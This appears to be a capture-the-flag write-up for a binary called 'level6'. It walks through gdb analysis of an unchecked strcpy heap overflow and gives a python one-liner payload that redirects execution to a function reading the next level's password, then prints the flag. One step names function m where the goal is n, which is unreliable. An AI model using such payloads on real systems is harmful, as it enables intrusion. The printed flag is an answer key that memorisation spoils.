@@ -1,0 +1,26 @@
+HOW TO FIND:
+
+First we are going to analyse the binary file 'level6'
+
+gdb level6
+
+'info functions' => We see 3 functions main, m and n and use of malloc and strcpy. strcpy is subject to buffer overflow as it doesn't check the size of the string copied. If the size of the argument isn't controlled then there is a risk of buffer overflow
+
+'disas main' => 
+
+1 malloc of size 0x40 (64)
+1 malloc of size 4
+strcpy argv[1] into malloc of size 64 -> no check of the length of argv[1] -> we are going to exploit this vulnerability
+call to the function m
+
+'disas m' => puts 'Nope"
+
+'disas n' => system "/bin/cat /home/user/level7/.pass" -> we want to call this function in order to find the flag.
+
+First let's find the offset were the buffer overflow occurs -> with wiremask buffer overflow pattern generator
+
+In gdb r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag => 0x41346341 => offset is 72
+
+Let's overwrite the EIP adress with the adress of the m function written in little endian '\x54\x84\x04\x08'
+
+./level6 $(python -c "print 'A' * 72 + '\x54\x84\x04\x08'") => the flag is f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
